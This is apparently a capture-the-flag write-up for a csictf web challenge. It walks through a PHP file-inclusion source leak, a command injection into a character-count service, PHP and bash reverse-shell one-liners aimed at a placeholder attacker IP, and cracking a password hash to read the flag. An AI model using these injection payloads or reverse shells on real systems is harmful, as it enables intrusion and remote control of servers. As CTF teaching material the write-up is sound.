# Body Count

## Challenge details 
**Category** : Web  
**points** : 493  
**Description** : Here’s a character count service for you!  
                  http://chall.csivit.com:30202
                 
## Solution
First time in the website we see a black screen written but nothing intresting by observing the url `http://chall.csivit.com:30202/?file=wc.php` we can see that's it's the content
of the `wc.php` so i tried checking `robots.txt` and we got this :


```
Disallow: /?file=checkpass.php
```


In order to be able to see the content of `checkpass.php` we can  use a php filter 


```
http://chall.csivit.com:30202/?file=php://filter/convert.base64-encode/resource=checkpass.php
```


Using that we got the base64 of the `checkpass.php` after decoding it we got this :  
**checkpass.php**


```
<?php
$password = "w0rdc0unt123";
// Cookie password.
echo "IMPORTANT!!! The page is still under development. This has a secret, do not push this page.";

header('Location: /');
```
So we got two intresting things a password and note saying it's a cookie password and by looking to our cookies we find out a cookie with name of `password` and 
value `PASSWORD` we will leave it like this for now because we need to understand first how this service is running by checking the content of `wc.php`,
we can easily do that using the same technique we used earlier  


```
http://chall.csivit.com:30202/?file=php://filter/convert.base64-encode/resource=wc.php
```
And This is the content of the file :  
**wc.php**
```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>wc as a service</title>
    <style>
        html,
        body {
            overflow: none;
            max-height: 100vh;
        }
    </style>
</head>

<body style="height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;">
    <?php
    ini_set('max_execution_time', 5);
    if ($_COOKIE['password'] !== getenv('PASSWORD')) {
        setcookie('password', 'PASSWORD');
        die('Sorry, only people from csivit are allowed to access this page.');
    }
    ?>

    <h1>Character Count as a Service</h1>
    <form>
        <input type="hidden" value="wc.php" name="file">
        <textarea style="border-radius: 1rem;" type="text" name="text" rows=30 cols=100></textarea><br />
        <input type="submit">
    </form>
    <?php
    if (isset($_GET["text"])) {
        $text = $_GET["text"];
        echo "<h2>The Character Count is: " . exec('printf \'' . $text . '\' | wc -c') . "</h2>";
    }
    ?>
</body>

</html>
```
By looking to the source code we can divide it into two parts 


#### Part One 
Our cookie password will get checked , in case of fail a message saying `Sorry, only people from csivit are allowed to access this page.` will appear and the rest 
of the code won't be executed due to the die() focntion . So we tried the password that we got earlier `w0rdc0unt123` and it worked now we can see the rest of the
webpage and pass to the second part 


#### Part Two
As we can see our input `Text`obtained by the GET form will be putten inside this command `printf '{text}' | wc -c`. We can easily bypass this and get a command execution
using this payload :  
`'; command # `  
* ` ' `  :  To close the first quote and complete the printf command  
* ` ; `  :  In order to specify a second command 
* `command`  :  This is the command tha we want to execute  
* `#`  :  To comment out the rest  


**Note** :  We will only get the last line of the result due to the exec focntion that only returns the last line of the result a way to bypass it is by adding `| head -n $line` after the command where $line represents the line you want to read but we will not need to do this here


So after that I tried `'; ls #` and this was the result : 
```
The Character Count is: wc.php
```
Bingo ! Our code injection worked now we will try to spawn a shell , at the begining i tried to do it with netcat and python but neither of those were present in the 
server so i did it using php and this was the command :   
```
php -r '$sock=fsockopen( "$your_adress_ip" , $port );exec("/bin/sh -i <&3 >&3 2>&3");'
```
The full command will be like this :
```
' ;  php -r '$sock=fsockopen( "$your_adress_ip" , $port );exec("/bin/sh -i <&3 >&3 2>&3");' #
```
Another way to do it is using the bach technique :  
```
bash -i >& /dev/tcp/$your_adress_ip/$port 0>&1
```
With that we were able to get a shell in the server and we were the user `www-data`  

```
www-data@9c9f6ae73053:/var/www/html$
````
After navigating a little bit inside the server I found two intresting files :   
* `flag.txt` : Which was located at `/ctf/system/of/a/down/` to find it you can use this `find / -iname "*flag*" ` .But we can't read it because of permissions, the only users who could read it are `root`
and `csictf`  
* `README` : A file located at `/ctf` and this was its content :
```
My password hash is 6f246c872cbf0b7fd7530b7aa235e67e.
```
So this is propably the password of the `csictf` user, all we need to do is crack it than su to csictf and read the flag . I wasn't able to crack it using john but  an online crackstation were able to crack it and this is the passsword `csictf` i think anyone 
could guess it  
Now we can change user to `csictf` using `su` and read the flag

##### The Flag 
```
csictf{1nj3ct10n_15_p41nfu1}
```











